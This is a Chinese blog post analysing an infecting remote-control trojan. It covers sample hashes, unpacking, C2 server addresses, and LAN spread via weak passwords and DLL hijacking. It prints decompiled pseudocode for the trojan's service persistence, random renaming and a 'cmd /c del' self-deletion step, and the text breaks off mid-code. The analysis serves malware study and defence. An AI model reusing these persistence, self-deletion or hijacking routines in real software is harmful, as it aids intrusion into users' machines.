---
title: 从 0 分析一款经典的感染型远控木马
author: 荒野猎人
wechat_source: >-
  http://mp.weixin.qq.com/s?timestamp=1496016642&src=3&ver=1&signature=1Hp-JGX68UwholXKdYsHgG9Oe2Y4Txgw7FIHUz2sSP2AphHbOB7c*JU7liblQGWtMVZen7MuttjQKfDcEubrQFKvhpt-Dh*Nier2Ts9yzqkCtvOH1X9n3cReG9UfnhfJkLaTdag95oUd16LsVMTm67wEHZ6En5IlajC3wn182ss=
date: '2017-05-25 00:00:00 +0000'

---

{% raw  %}
<p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">终于毕业考试完了。经过节奏紧张的培训，一直没有好好分析一个病毒或者一个完整的软件，用了4天时间，分析了一款经典的感染型远控木马，期间因为调试服务，调试 DLL 花费了不少时间。稍后整理完也会首发看雪，在咱们看雪已经潜水1年多了，之前一直觉得没什么有营养的东西可以和大家分享，希望这篇文章能给想分析病毒入门的童鞋带来帮助，水平有限，有不足的地方欢迎指点。</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">还有个同学跟我一起分析了，我没做流程图，此流程图由年轻帅气可爱的老朱同学赞助：</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">流程图_start：<br></span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">病毒首先使用 RegOpenKeyExW 函数读取注册表中【HKEY_LOCAL_MACHINE\system\\CurrentControlset\\services\\Ghijkl Nopqrstu Wxy】</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">这个键项；如果键项不存在，则创建病毒的系统服务，流程图大体如下：</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><img src="/ikanxue/images/cc9d6573b6ec3e0440441a1111d49ae7e0ba9727.png" style="width: 554px !important; height: 265px !important; visibility: visible !important;"><br></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><img src="/ikanxue/images/5d8dc4a028485a8f225c4ed26db73bba114ce80f.png" style="width: 554px !important; height: 303px !important;"><br></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">老朱同学的流程图 _end</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"><br></span></p><section class="" data-tools="135编辑器" data-id="86517" style="border-width: 0px; border-style: none; border-color: currentcolor; -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; padding: 0px;"><section style="border-top: 1px solid rgb(221, 221, 221); margin: 10px auto;"><p class="" data-brushtype="text" style="padding: 6px 5px 0px; border-top: 2px solid rgb(239, 112, 96); display: inline-block; margin: -1px 0px 0px; font-weight: normal; line-height: 1.1; font-size: 18px;">1.1 样本信息<br></p></section></section><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"></span><br></p><table cellspacing="0" cellpadding="0"><tbody><tr><td style="padding: 5px;" width="99" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">病毒名</span></p></td><td style="border-width: 1px 1px 1px medium; border-color: rgb(163, 163, 163) rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; border-left: medium none; padding: 5px;" width="311" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">3601.exe</span></p></td></tr><tr><td style="border-width: medium 1px 1px; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163); border-top: medium none; padding: 5px;" width="99" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">样本大小</span></p></td><td style="border-width: medium 1px 1px medium; border-top: medium none; border-left: medium none; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; padding: 5px;" width="311" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">72KB</span></p></td></tr><tr><td style="border-width: medium 1px 1px; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163); border-top: medium none; padding: 5px;" width="99" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">分析时间</span></p></td><td style="border-width: medium 1px 1px medium; border-top: medium none; border-left: medium none; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; padding: 5px;" width="311" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">2017-5-16</span></p></td></tr><tr><td style="border-width: medium 1px 1px; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163); border-top: medium none; padding: 5px;" width="99" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">MD5:</span></p></td><td style="border-width: medium 1px 1px medium; border-top: medium none; border-left: medium none; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; padding: 5px;" width="311" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">96043b8dcc7a977b16a2892c4b38d87f</span></p></td></tr><tr><td style="border-width: medium 1px 1px; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163); border-top: medium none; padding: 5px;" width="99" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">加壳情况:</span></p></td><td style="border-width: medium 1px 1px medium; border-top: medium none; border-left: medium none; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; padding: 5px; word-break: break-all;" width="311" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">UPX(3.07)</span></p></td></tr></tbody></table><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"><br></span></p><section class="" data-tools="135编辑器" data-id="86517" style="border-width: 0px; border-style: none; border-color: currentcolor; -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; padding: 0px;"><section style="border-top: 1px solid rgb(221, 221, 221); margin: 10px auto;"><p class="" data-brushtype="text" style="padding: 6px 5px 0px; border-top: 2px solid rgb(239, 112, 96); display: inline-block; margin: -1px 0px 0px; font-weight: normal; line-height: 1.1; font-size: 18px;">1.2 测试环境及工具<br></p></section></section><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"></span><br></p><table cellspacing="0" cellpadding="0"><tbody><tr><td style="padding: 5px;" width="97" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">测试平台</span></p></td><td style="border-width: 1px 1px 1px medium; border-color: rgb(163, 163, 163) rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; border-left: medium none; padding: 5px;" width="175" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">虚拟机WIN7</span></p></td></tr><tr><td style="border-width: medium 1px 1px; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163); border-top: medium none; padding: 5px;" width="97" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">使用工具</span></p></td><td style="border-width: medium 1px 1px medium; border-top: medium none; border-left: medium none; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; padding: 5px;" width="175" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">OLLYDEBUG+IDA6.8</span></p></td></tr><tr><td style="border-width: medium 1px 1px; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163); border-top: medium none; padding: 5px;" width="97" valign="top"><br></td><td style="border-width: medium 1px 1px medium; border-top: medium none; border-left: medium none; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; padding: 5px;" width="175" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">LordPe</span></p></td></tr><tr><td style="border-width: medium 1px 1px; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163); border-top: medium none; padding: 5px;" width="97" valign="top"><br></td><td style="border-width: medium 1px 1px medium; border-top: medium none; border-left: medium none; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; padding: 5px; word-break: break-all;" width="175" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">火绒剑</span></p></td></tr></tbody></table><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"><br></span></p><section class="" data-tools="135编辑器" data-id="86517" style="border-width: 0px; border-style: none; border-color: currentcolor; -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; padding: 0px;"><section style="border-top: 1px solid rgb(221, 221, 221); margin: 10px auto;"><p class="" data-brushtype="text" style="padding: 6px 5px 0px; border-top: 2px solid rgb(239, 112, 96); display: inline-block; margin: -1px 0px 0px; font-weight: normal; line-height: 1.1; font-size: 18px;">1.3 目标概述<br></p></section></section><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"></span><br></p><table cellspacing="0" cellpadding="0"><tbody><tr><td style="padding: 5px;" width="113" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">病毒母体</span></p></td><td style="border-width: 1px 1px 1px medium; border-color: rgb(163, 163, 163) rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; border-left: medium none; padding: 5px;" width="111" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">3601.exe </span></p></td><td style="border-width: 1px 1px 1px medium; border-color: rgb(163, 163, 163) rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; border-left: medium none; padding: 5px;" width="307" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">96043b8dcc7a977b16a2892c4b38d87f</span></p></td><td style="border-width: 1px 1px 1px medium; border-color: rgb(163, 163, 163) rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; border-left: medium none; padding: 5px;" width="373" valign="top"><br></td></tr><tr><td style="border-width: medium 1px 1px; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163); border-top: medium none; padding: 5px;" width="113" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">释放的文件</span></p></td><td style="border-width: medium 1px 1px medium; border-top: medium none; border-left: medium none; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; padding: 5px;" width="111" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">vmnfmc.exe</span></p></td><td style="border-width: medium 1px 1px medium; border-top: medium none; border-left: medium none; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; padding: 5px;" width="307" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">8a1716b566d20b77c20647d0f760b01c</span></p></td><td style="border-width: medium 1px 1px medium; border-top: medium none; border-left: medium none; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; padding: 5px;" width="373" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">随机字母组成</span></p></td></tr><tr><td style="border-width: medium 1px 1px; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163); border-top: medium none; padding: 5px;" width="113" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">释放的DLL</span></p></td><td style="border-width: medium 1px 1px medium; border-top: medium none; border-left: medium none; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; padding: 5px;" width="111" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">Hra33.dll</span></p></td><td style="border-width: medium 1px 1px medium; border-top: medium none; border-left: medium none; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; padding: 5px;" width="307" valign="top"><br></td><td style="border-width: medium 1px 1px medium; border-top: medium none; border-left: medium none; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; padding: 5px;" width="373" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">资源文件 主要存放2个资源 服务名和病毒EXE</span></p></td></tr></tbody></table><p><br></p><section class="" data-tools="135编辑器" data-id="86517" style="border-width: 0px; border-style: none; border-color: currentcolor; -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; padding: 0px;"><section style="border-top: 1px solid rgb(221, 221, 221); margin: 10px auto;"><p class="" data-brushtype="text" style="padding: 6px 5px 0px; border-top: 2px solid rgb(239, 112, 96); display: inline-block; margin: -1px 0px 0px; font-weight: normal; line-height: 1.1; font-size: 18px;">2. 具体行为分析<br></p></section></section><p style="line-height: 1.75em; margin-top: 25px; margin-bottom: 25px; text-indent: 0em;"><span style="font-size: 16px;"><strong>2.1 主要行为</strong></span></p><table cellspacing="0" cellpadding="0"><tbody><tr><td style="padding: 5px;" width="113" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">病毒母体</span></p></td><td style="border-width: 1px 1px 1px medium; border-color: rgb(163, 163, 163) rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; border-left: medium none; padding: 5px;" width="856" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">通过创建系统服务 释放文件(随机名称.exe)到系统目录,删除自身.释放的目标EXE以服务的方式开机自启动.</span></p></td></tr><tr><td style="border-width: medium 1px 1px; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163); border-top: medium none; padding: 5px;" width="113" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">释放的病毒</span></p></td><td style="border-width: medium 1px 1px medium; border-top: medium none; border-left: medium none; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; padding: 5px;" width="856" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">开启多线程进行 通过局域网共享病毒 连接服务器 进行病毒的自我更新 远程指令 等操作</span></p></td></tr><tr><td style="border-width: medium 1px 1px; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163); border-top: medium none; padding: 5px;" width="113" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">释放的DLL</span></p></td><td style="border-width: medium 1px 1px medium; border-top: medium none; border-left: medium none; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; padding: 5px;" width="856" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">Hra33.dll 资源文件 主要存放2个资源 服务名和病毒EXE 具有感染文件的功能 </span></p></td></tr><tr><td style="border-width: medium 1px 1px; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163); border-top: medium none; padding: 5px;" width="113" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">远程服务器</span></p></td><td style="border-width: medium 1px 1px medium; border-top: medium none; border-left: medium none; border-color: currentcolor rgb(163, 163, 163) rgb(163, 163, 163) currentcolor; padding: 5px;" width="856" valign="top"><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">Sbcq.f3322.org:9898&nbsp;&nbsp; &nbsp; </span><a style="font-size: 15px; text-decoration: underline;"><span style="font-size: 15px;">www.520123.xyz:9999</span></a><span style="font-size: 15px;">&nbsp; </span><a style="font-size: 15px; text-decoration: underline;"><span style="font-size: 15px;">www.520520520.org:9426</span></a></p></td></tr></tbody></table><p><br></p><p style="margin-top: 15px; line-height: 1.75em; margin-bottom: 25px;"><span style="font-size: 16px;"><strong>2.1.1 恶意程序对用户造成的危害</strong></span></p><ul style="list-style-type: disc;" class="list-paddingleft-2"><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">将病毒程序通过弱密码感染到局域网主机 at 计划任务</span></p></li><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">从服务器下载任意EXE程序并运行</span></p></li><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">从服务器获得任意URL在本地打开</span></p></li><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">Vmnfmc.exe 释放 C:\WINDOWS\system32\hra33.dll并载入 创建三个线程</span></p></li><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">遍历到的是EXE文件则拷贝病毒模块文件lpk.dll到该EXE文件的文件目录下进行DLL劫持</span></p></li><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">如果上面对用户电脑的文件遍历，遍历到的是 RAR 或者 ZIP 格式的压缩包文件，则对压缩包里面的 EXE 文件进行 DLL 劫持，拷贝病毒模块文件 lpk.dll 到压缩包里的 EXE 文件目录下。</span></p></li><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">如果当前运行的病毒模块不是病毒文件 lpk 的 dll 则动态加载系统的 lpk.dll 并进行 lpk.dll 文件的初始 为 dll 直接转发的方式劫持系统文件 lpk.dll 做准备。</span></p></li></ul><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">&nbsp;</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 16px;"><strong>2.2 恶意代码分析</strong></span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><strong><span style="font-size: 15px; color: rgb(158, 87, 65);">Step 1</span></strong><span style="font-size: 15px;">. 将目标程序载入PEID 查看是 USP 的壳 利用 ESP 定律&nbsp; <br> &nbsp;</span><img src="/ikanxue/images/744bbcaa8403cc65e5d46b26c08a24f058d9dfaa.png" style="width: 770px !important; height: 323.358px !important;"></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">脱壳成功</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><img src="/ikanxue/images/0acf4cc72147c3d6cc0000322c0a95c1688a5c02.png" style="width: 770px !important; height: 59.8795px !important;"></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><strong><span style="font-size: 15px; color: rgb(158, 87, 65);">Step 2.</span></strong><span style="font-size: 15px;"> 载入 IDA 分析 Main 函数 为方便阅读 以下均是伪代码</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"></span></p><blockquote><p style="line-height: normal;"><span style="font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WSAStartup(0x202u, &amp;WSAData);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">if (Check_Server())&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 判断是否有注册表服务是否存在</span></p><p style="line-height: normal;"><span style="font-size: 14px;">{</span></p><p style="line-height: normal;"><span style="font-size: 14px;">v7 = 0;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">v8 = 0;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">ServiceStartTable.lpServiceName = "Ghijkl Nopqrstu Wxy";</span></p><p style="line-height: normal;"><span style="font-size: 14px;">ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)sub_40561A;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">StartServiceCtrlDispatcherA(&amp;ServiceStartTable);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">}</span></p><p style="line-height: normal;"><span style="font-size: 14px;">else&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 母体病毒进入 开始初始化 </span></p><p style="line-height: normal;"><span style="font-size: 14px;">{</span></p><p style="line-height: normal;"><span style="font-size: 14px;">Init_virs(</span></p><p style="line-height: normal;"><span style="font-size: 14px;">(int)"Ghijkl &nbsp; Nopqrstu Wxy",</span></p><p style="line-height: normal;"><span style="font-size: 14px;">(int)"Ghijkl &nbsp; Nopqrstu Wxyabcde Ghij",</span></p><p style="line-height: normal;"><span style="font-size: 14px;">(int)"Ghijklmn &nbsp; Pqrstuvwx Abcdefg Ijklmnop Rst");</span></p><p style="line-height: normal;"><span style="font-size: 14px;">if (ReName)</span></p><p style="line-height: normal;"><span style="font-size: 14px;">{</span></p><p style="line-height: normal;"><span style="font-size: 14px;">DeleteSelf();</span></p><p style="line-height: normal;"><span style="font-size: 14px;">ExitProcess(0);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">}</span></p><p style="line-height: normal;"><span style="font-size: 14px;">}</span></p></blockquote><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">第一次打开病毒文件&nbsp; 会进入 Init_virs</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><img src="/ikanxue/images/19f08551bbca21737ce115cb5ba37014e16a8c4d.png" style="width: 706px !important; height: 516px !important;"><span style="font-size: 15px;">先载入各种操作服务和注册表的函数</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"></span></p><blockquote><p style="line-height: normal;"><span style="font-size: 14px;">GetModuleFileNameA(0u, &amp;Filename, 0x104u);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">GetWindowsDirectoryA(&amp;Buffer, 0x104u);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">Bufflen = strlen(&amp;Buffer);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">if (strncmp(&amp;Buffer, &nbsp; &amp;Filename, Bufflen)) //判断是否需要重新生成一个病毒 名称是随机的</span></p><p style="line-height: normal;"><span style="font-size: 14px;">{</span></p><p style="line-height: normal;"><span style="font-size: 14px;">charA = &nbsp; Get_Randchar(26u) + 'a';</span></p><p style="line-height: normal;"><span style="font-size: 14px;">charB = &nbsp; Get_Randchar(26u) + 'a';</span></p><p style="line-height: normal;"><span style="font-size: 14px;">charC = &nbsp; Get_Randchar(26u) + 'a';</span></p><p style="line-height: normal;"><span style="font-size: 14px;">charD = &nbsp; Get_Randchar(26u) + 'a';</span></p><p style="line-height: normal;"><span style="font-size: 14px;">charE = &nbsp; Get_Randchar(26u) + 'a';</span></p><p style="line-height: normal;"><span style="font-size: 14px;">charF = &nbsp; Get_Randchar(26u);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">wsprintfA(&amp;strExeName, "%c%c%c%c%c%c.exe", charF + 'a', &nbsp; charE, charD, charC, charB, charA);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">mbscat(&amp;Buffer, L"\\");</span></p><p style="line-height: normal;"><span style="font-size: 14px;">mbscat(&amp;Buffer, &amp;strExeName);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">((void(__stdcall *)(CHAR *, CHAR *, &nbsp; _DWORD))CopyFileA)(&amp;Filename, &amp;Buffer, 0);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">memset(&amp;Filename, 0, 0x104u);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">mbscpy(&amp;Filename, &nbsp; &amp;Buffer);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">ReName = 1;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">}</span></p></blockquote><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">载入服务 修改服务描述 , 修改服务配置 , 开启服务等操作</span></p><blockquote><p style="line-height: normal;"><span style="font-size: 14px;">if (ReName)</span></p><p style="line-height: normal;"><span style="font-size: 14px;">{</span></p><p style="line-height: normal;"><span style="font-size: 14px;">DeleteSelf();</span></p><p style="line-height: normal;"><span style="font-size: 14px;">ExitProcess(0);</span></p><p style="line-height: normal;"><span style="font-size: 14px;">}</span></p><p style="line-height: normal;"><span style="font-size: 14px;">DeleteSelf()函数实现细节</span></p></blockquote><p style="line-height: normal;"><span style="font-size: 14px;"><br></span></p><blockquote><p><span style="font-size: 14px;">GetModuleFileNameA(0, &amp;Filename, &nbsp; 0x104u);&nbsp;&nbsp;&nbsp;&nbsp; // 获得当前EXE路径</span></p><p><span style="font-size: 14px;">GetShortPathNameA(&amp;Filename, &nbsp; &amp;Filename, 0x104u);// 获得文件名</span></p><p><span style="font-size: 14px;">GetEnvironmentVariableA("COMSPEC", &amp;Buffer, 0x104u);// 获取CMD的路径</span></p><p><span style="font-size: 14px;">((void(__stdcall *)(char *, const char *))lstrcatA)(&amp;Shellcommand, "/c del ");</span></p><p><span style="font-size: 14px;">((void(__stdcall *)(char *, CHAR *))lstrcatA)(&amp;Shellcommand, &amp;Filename);</span></p><p><span style="font-size: 14px;">((void(__stdcall *)(char *, const char *))lstrcatA)(&amp;Shellcommand, " &gt; nul");// /c &nbsp; del C:\xxxx\3601_U~1.EXE &gt; nul</span></p><p><span style="font-size: 14px;">v19 = &amp;v26;</span></p><p><span style="font-size: 14px;">v20 = &amp;Buffer;</span></p><p><span style="font-size: 14px;">v16 = '&lt;';</span></p><p><span style="font-size: 14px;">v18 = 0;</span></p><p><span style="font-size: 14px;">v26 = 'O';</span></p><p><span style="font-size: 14px;">v27 = 'p';</span></p><p><span style="font-size: 14px;">v28 = 'e';</span></p><p><span style="font-size: 14px;">v29 = 'n';</span></p><p><span style="font-size: 14px;">v30 = 0;</span></p><p><span style="font-size: 14px;">v21 = &nbsp; &amp;Shellcommand;</span></p><p><span style="font-size: 14px;">v22 = 0;</span></p><p><span style="font-size: 14px;">v23 = 0;</span></p><p><span style="font-size: 14px;">v17 = 64;</span></p><p><span style="font-size: 14px;">if (ShellExecuteEx(&amp;v16))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 运行删除自身的指令</span></p><p><span style="font-size: 14px;">{</span></p><p><span style="font-size: 14px;">SetPriorityClass(hProcess, 64u);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 设置线程优先级</span></p><p><span style="font-size: 14px;">hProcessa = GetCurrentProcess();</span></p><p><span style="font-size: 14px;">SetPriorityClass(hProcessa, 256u);</span></p><p><span style="font-size: 14px;">v2 = GetCurrentThread();</span></p><p><span style="font-size: 14px;">SetThreadPriority(v2, 15);</span></p><p><span style="font-size: 14px;">SHChangeNotify(SHCNE_DELETE, SHCNF_PATHA, &amp;Filename, 0);// 删除当前进程的EXE程序</span></p><p><span style="font-size: 14px;">result = 1;</span></p><p><span style="font-size: 14px;">}</span></p></blockquote><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">这也就完成了 释放新病毒 删除自身的操作</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">刚刚分析的是病毒第一次运行的操作，现在进入病毒第二次运行的操作。</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"></span></p><blockquote><p style="line-height: normal;"><span style="font-size: 14px;">ServiceStartTable.lpServiceName = "Ghijkl Nopqrstu Wxy";</span></p><p style="line-height: normal;"><span style="font-size: 14px;">ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)sub_40561A;</span></p><p style="line-height: normal;"><span style="font-size: 14px;">StartServiceCtrlDispatcherA(&amp;ServiceStartTable)</span></p></blockquote><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">进入回到函数</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><img src="/ikanxue/images/9055cff9aa37d07799712c8cadf648f67e043e69.png" style="width: 770px !important; height: 150.792px !important;"><span style="font-size: 15px;">先设置服务状态 后面加载当前函数需要使用的函数</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">木马程序主体框架结构：</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"></span></p><blockquote><p style="line-height: normal;"><span style="font-size: 14px;">if (CreatemutexA(0, 0, "Ghijkl &nbsp; Nopqrstu Wxy")&amp;&amp; SetServiceStatus() == 183) // 创建互斥体&nbsp; 存在的话 服务退出</span></p><p style="line-height: normal;"><span 